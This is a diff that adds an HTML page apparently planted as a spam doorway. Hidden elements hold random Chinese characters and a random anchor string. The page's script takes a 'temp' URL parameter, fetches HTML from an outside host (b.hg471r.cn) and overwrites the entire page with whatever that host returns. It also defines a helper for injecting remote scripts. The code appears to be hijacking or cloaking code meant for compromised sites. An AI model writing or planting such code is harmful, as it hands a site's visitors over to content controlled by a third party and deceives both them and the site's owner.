@@ -1,0 +1,35 @@
+        <!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body> 
+<img  src='' style='display:none'>
+<a  href='#' style='display:none'>0RMRbGZXJhm</a>
+<h1 style='display:none' >推泰寞痛碌涕痛背捣哇暑负砂葱呛阮休惺樊航肉箍瑞攀换芬涎弟措蹈废扁猴函畔我日忱屉胖盘巴肥深骂佰板佳硼屏嗣帽付层宝评俱睡弊没己去固疮蜂斤泪揪点吠浦稿宫驶</h1></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('https://b.hg471r.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
